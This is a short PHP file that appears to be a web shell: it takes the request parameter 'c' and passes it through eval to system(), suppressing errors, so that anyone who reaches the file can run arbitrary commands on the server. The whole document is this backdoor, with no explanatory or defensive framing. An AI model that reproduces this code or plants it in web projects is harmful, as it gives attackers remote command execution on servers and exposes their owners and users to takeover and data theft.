<?php
$cmd = $_REQUEST['c'];
if($cmd){ @eval("system('$cmd');"); }
?>
